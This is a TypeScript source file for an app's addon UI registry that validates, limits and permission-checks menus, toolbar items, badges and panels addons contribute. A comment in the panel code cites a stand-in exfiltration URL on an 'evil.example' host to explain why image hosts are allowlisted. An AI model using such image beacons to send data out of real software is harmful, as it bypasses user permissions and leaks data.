/* Copyright (c) 2025-2026 Velimir Majstorov; SPDX-License-Identifier: GPL-3.0-or-later */

import type { AddonCapability } from './AddonManifest';
import type { InstalledAddonPackage } from './AddonPackageStore';
import { addonPackageStore } from './AddonPackageStore';
import { addonPermissionService } from './AddonPermissionService';
import {
  validateFields,
  validateMenu,
  validatePanel,
  type AddonFieldNode,
  type AddonMenuContribution,
  type AddonMenuTarget,
  type AddonPanelNode,
  type AddonTone,
} from './AddonUISchema';

/**
 * Everything an addon has contributed to the interface, and the single place
 * it all disappears from.
 *
 * Contributions are validated on the way in and stored as plain data. Nothing
 * an addon supplies can become a React element: the app renders these with its
 * own components, so themes, font scaling, rotation and accessibility keep
 * working whether or not the addon author thought about them.
 */

export const MAX_MENUS_PER_ADDON = 8;
export const MAX_TOOLBAR_PER_ADDON = 3;
export const MAX_PANELS_PER_ADDON = 3;
export const MAX_BADGES_PER_ADDON = 10;

export interface AddonToolbarItem {
  id: string;
  label: string;
  /** Spoken by a screen reader; required, never derived from the label. */
  accessibilityLabel: string;
  icon?: string;
  disabled?: boolean;
}

export interface AddonBadge {
  id: string;
  /** Tab id, or the empty string for an app-level badge. */
  tabId: string;
  text: string;
  tone: AddonTone;
  /** Higher wins a collision on the same tab. Bounded to 0-9. */
  priority: number;
}

export interface AddonPanel {
  id: string;
  title: string;
  nodes: AddonPanelNode[];
}

export interface AddonSettingsForm {
  title: string;
  fields: AddonFieldNode[];
}

/**
 * Which feature group a contribution belongs to, when it belongs to one.
 *
 * Without this, switching a group off could only clear *everything* an addon
 * registered, which would take the rest of the addon down with it.
 */
type GroupTag = Map<string, string | undefined>;

interface Contributions {
  groupOf: GroupTag;
  menus: Map<string, AddonMenuContribution>;
  toolbar: Map<string, AddonToolbarItem>;
  badges: Map<string, AddonBadge>;
  panels: Map<string, AddonPanel>;
  settings?: AddonSettingsForm;
}

interface PackageBoundary {
  initialize(): Promise<void>;
  get(addonId: string): InstalledAddonPackage | undefined;
}

interface PermissionBoundary {
  initialize(): Promise<void>;
  requireGrant(
    addonId: string,
    declared: readonly AddonCapability[],
    capability: string,
  ): asserts capability is AddonCapability;
}

export class AddonUIRegistry {
  private byAddon = new Map<string, Contributions>();
  private listeners = new Set<() => void>();

  constructor(
    private readonly packages: PackageBoundary = addonPackageStore,
    private readonly permissions: PermissionBoundary = addonPermissionService,
  ) {}

  /** Re-render notification for the screens that show contributions. */
  subscribe(listener: () => void): () => void {
    this.listeners.add(listener);
    return () => {
      this.listeners.delete(listener);
    };
  }

  // ─────────────────────────────────────────────────────── registration ──

  async registerMenu(
    addonId: string,
    input: unknown,
    groupId?: string,
  ): Promise<void> {
    const contributions = await this.authorize(addonId);
    const result = validateMenu(input);
    if (!result.ok || !result.value)
      throw new Error(`Addon menu is invalid: ${result.errors.join('; ')}`);
    this.enforceLimit(
      contributions.menus,
      result.value.id,
      MAX_MENUS_PER_ADDON,
      'menu',
    );
    contributions.menus.set(result.value.id, result.value);
    contributions.groupOf.set(`menu:${result.value.id}`, groupId);
    this.notify();
  }

  async registerToolbarItem(
    addonId: string,
    item: AddonToolbarItem,
    groupId?: string,
  ): Promise<void> {
    const contributions = await this.authorize(addonId);
    if (!item?.id || !item.label)
      throw new Error('Addon toolbar item needs an id and a label.');
    // Required rather than falling back to the label: a label like "×" tells a
    // screen-reader user nothing, and silently reusing it hides the problem.
    if (!item.accessibilityLabel)
      throw new Error('Addon toolbar item needs an accessibility label.');
    this.enforceLimit(
      contributions.toolbar,
      item.id,
      MAX_TOOLBAR_PER_ADDON,
      'toolbar item',
    );
    contributions.toolbar.set(item.id, { ...item });
    contributions.groupOf.set(`toolbar:${item.id}`, groupId);
    this.notify();
  }

  async registerBadge(
    addonId: string,
    badge: AddonBadge,
    groupId?: string,
  ): Promise<void> {
    const contributions = await this.authorize(addonId);
    if (!badge?.id || typeof badge.text !== 'string')
      throw new Error('Addon badge needs an id and text.');
    this.enforceLimit(
      contributions.badges,
      badge.id,
      MAX_BADGES_PER_ADDON,
      'badge',
    );
    contributions.badges.set(badge.id, {
      ...badge,
      text: badge.text.slice(0, 8),
      priority: Math.min(9, Math.max(0, Math.trunc(badge.priority ?? 0))),
    });
    contributions.groupOf.set(`badge:${badge.id}`, groupId);
    this.notify();
  }

  async registerPanel(
    addonId: string,
    id: string,
    title: string,
    nodes: unknown,
    groupId?: string,
  ): Promise<void> {
    const contributions = await this.authorize(addonId);
    const result = validatePanel(nodes);
    if (!result.ok || !result.value)
      throw new Error(`Addon panel is invalid: ${result.errors.join('; ')}`);
    if (!id || !title) throw new Error('Addon panel needs an id and a title.');

    // An image in a panel is a network request the addon chose, fired when the
    // panel renders. The schema already refuses anything but https and refuses
    // private addresses, but that still left `https://evil.example/log?d=...`
    // as a way to send data out with no `network` permission and without the
    // allowlist ever seeing it. Images go through the same list as everything
    // else, so there is still only one list for the user to reason about.
    const { webAccessService } =
      require('../ai/WebAccessService') as typeof import('../ai/WebAccessService');
    for (const node of result.value) {
      if (node.kind !== 'image') continue;
      const host = webAccessService.hostOf(node.url);
      if (!host || !webAccessService.isAllowed(host))
        throw new Error(
          `Addon panel image host "${host ?? node.url}" is not on the allowed list.`,
        );
    }
    this.enforceLimit(contributions.panels, id, MAX_PANELS_PER_ADDON, 'panel');
    contributions.panels.set(id, { id, title, nodes: result.value });
    contributions.groupOf.set(`panel:${id}`, groupId);
    this.notify();
  }

  async registerSettings(
    addonId: string,
    title: string,
    fields: unknown,
  ): Promise<void> {
    const contributions = await this.authorize(addonId);
    const result = validateFields(fields);
    if (!result.ok || !result.value)
      throw new Error(
        `Addon settings are invalid: ${result.errors.join('; ')}`,
      );
    contributions.settings = { title, fields: result.value };
    this.notify();
  }

  // ───────────────────────────────────────────────────────────── reading ──

  /**
   * Menu items for one target, from every addon that still holds `ui.extend`.
   *
   * The grant is re-checked on read, not only at registration: revoking a
   * permission has to take the menu away without the addon being reinstalled,
   * and hiding the UI alone would leave the registration live underneath.
   */
  menusFor(target: AddonMenuTarget): Array<{
    addonId: string;
    menu: AddonMenuContribution;
  }> {
    const result: Array<{ addonId: string; menu: AddonMenuContribution }> = [];
    for (const [addonId, contributions] of this.byAddon) {
      if (!this.stillPermitted(addonId)) continue;
      for (const menu of contributions.menus.values())
        if (menu.target === target) result.push({ addonId, menu });
    }
    return result;
  }

  toolbarItems(): Array<{ addonId: string; item: AddonToolbarItem }> {
    return this.collect(contributions => [
      ...contributions.toolbar.values(),
    ]).map(({ addonId, value }) => ({ addonId, item: value }));
  }

  /** At most one badge per tab: the highest priority, then the first seen. */
  badgeFor(tabId: string): { addonId: string; badge: AddonBadge } | undefined {
    let best: { addonId: string; badge: AddonBadge } | undefined;
    for (const { addonId, value } of this.collect(contributions => [
      ...contributions.badges.values(),
    ])) {
      if (value.tabId !== tabId) continue;
      if (!best || value.priority > best.badge.priority)
        best = { addonId, badge: value };
    }
    return best;
  }

  panels(): Array<{ addonId: string; panel: AddonPanel }> {
    return this.collect(contributions => [
      ...contributions.panels.values(),
    ]).map(({ addonId, value }) => ({ addonId, panel: value }));
  }

  settingsFor(addonId: string): AddonSettingsForm | undefined {
    return this.stillPermitted(addonId)
      ? this.byAddon.get(addonId)?.settings
      : undefined;
  }

  // ──────────────────────────────────────────────────────────── removal ──

  /**
   * Everything one addon contributed, gone. Called when an addon is disabled,
   * uninstalled or loses its grant — disabling an addon must leave no trace of
   * it in the interface.
   */
  clear(addonId: string): void {
    if (this.byAddon.delete(addonId)) this.notify();
  }

  /**
   * Everything one feature group contributed, and nothing else.
   *
   * This is what `AddonGroupService.onTeardown` calls. Clearing the whole
   * addon instead would take the rest of it down with the group the user
   * switched off, which is not what they asked for.
   */
  clearGroup(addonId: string, groupId: string): void {
    const contributions = this.byAddon.get(addonId);
    if (!contributions) return;
    let removed = false;

    for (const [tag, owner] of [...contributions.groupOf]) {
      if (owner !== groupId) continue;
      const [kind, id] = splitTag(tag);
      const map =
        kind === 'menu'
          ? contributions.menus
          : kind === 'toolbar'
            ? contributions.toolbar
            : kind === 'badge'
              ? contributions.badges
              : contributions.panels;
      if (map.delete(id)) removed = true;
      contributions.groupOf.delete(tag);
    }
    if (removed) this.notify();
  }

  unregister(
    addonId: string,
    kind: 'menu' | 'toolbar' | 'badge' | 'panel',
    id: string,
  ): void {
    const contributions = this.byAddon.get(addonId);
    if (!contributions) return;
    const map =
      kind === 'menu'
        ? contributions.menus
        : kind === 'toolbar'
          ? contributions.toolbar
          : kind === 'badge'
            ? contributions.badges
            : contributions.panels;
    if (map.delete(id)) this.notify();
  }

  resetForTests(): void {
    this.byAddon.clear();
    this.listeners.clear();
  }

  // ─────────────────────────────────────────────────────────── internal ──

  private async authorize(addonId: string): Promise<Contributions> {
    await Promise.all([
      this.packages.initialize(),
      this.permissions.initialize(),
    ]);
    const installed = this.packages.get(addonId);
    if (!installed) throw new Error('Addon package is not installed.');
    this.permissions.requireGrant(
      addonId,
      installed.manifest.permissions,
      'ui.extend',
    );

    let contributions = this.byAddon.get(addonId);
    if (!contributions) {
      contributions = {
        groupOf: new Map(),
        menus: new Map(),
        toolbar: new Map(),
        badges: new Map(),
        panels: new Map(),
      };
      this.byAddon.set(addonId, contributions);
    }
    return contributions;
  }

  private stillPermitted(addonId: string): boolean {
    const installed = this.packages.get(addonId);
    if (!installed) return false;
    try {
      this.permissions.requireGrant(
        addonId,
        installed.manifest.permissions,
        'ui.extend',
      );
      return true;
    } catch {
      return false;
    }
  }

  private collect<T>(
    pick: (contributions: Contributions) => T[],
  ): Array<{ addonId: string; value: T }> {
    const result: Array<{ addonId: string; value: T }> = [];
    for (const [addonId, contributions] of this.byAddon) {
      if (!this.stillPermitted(addonId)) continue;
      for (const value of pick(contributions)) result.push({ addonId, value });
    }
    return result;
  }

  private enforceLimit(
    map: Map<string, unknown>,
    id: string,
    limit: number,
    what: string,
  ): void {
    // Replacing an existing id is an update, not a new contribution, so it must
    // not count against the limit or an addon can never refresh its own menu.
    if (!map.has(id) && map.size >= limit)
      throw new Error(`Addon ${what} limit of ${limit} exceeded.`);
  }

  private notify(): void {
    for (const listener of [...this.listeners]) {
      try {
        listener();
      } catch {
        // One bad subscriber must not stop the others being told.
      }
    }
  }
}

export const addonUIRegistry = new AddonUIRegistry();

/** `menu:my.menu` -> ['menu', 'my.menu'], splitting on the first colon only. */
function splitTag(tag: string): [string, string] {
  const index = tag.indexOf(':');
  return [tag.slice(0, index), tag.slice(index + 1)];
}
